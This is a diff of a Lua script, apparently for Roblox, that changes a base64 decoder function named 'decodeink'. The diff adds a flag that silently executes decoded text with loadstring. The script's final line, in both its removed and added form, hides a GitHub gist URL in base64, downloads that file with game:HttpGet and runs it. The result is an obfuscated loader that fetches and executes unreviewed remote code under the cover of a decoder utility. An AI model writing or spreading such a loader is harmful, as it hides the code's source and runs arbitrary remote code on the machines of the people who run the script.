@@ -1,7 +1,8 @@
-function decodeink(data)
+function decodeink(data, autolaunch)
+    local autolaunch = autolaunch or false
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
+    local decoded = (data:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
@@ -12,6 +13,14 @@ function decodeink(data)
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
+    if autolaunch == true then
+        pcall(function()
+        loadstring(decoded)()
+        end)
+    end
+    return decoded
 end
 
-return loadstring(game:HttpGet(tostring(decodeink("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qcm82NjZQcm8vODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3LzdiNDUzYjRmMzU1ZmFkYzFkZThkODM1NjMwNGRjNTg5ODVkMzhhNzgvaWRrLnR4dA=="))))()
+
+
+return loadstring(game:HttpGet(tostring(decodeink("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qcm82NjZQcm8vODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3LzZjZGQ0OTlkZDg4NGYzOTEwYmNlOGNkZmU4ZmNlMDg1MDlhYzdmNzQvaWRrLnR4dA=="))))()
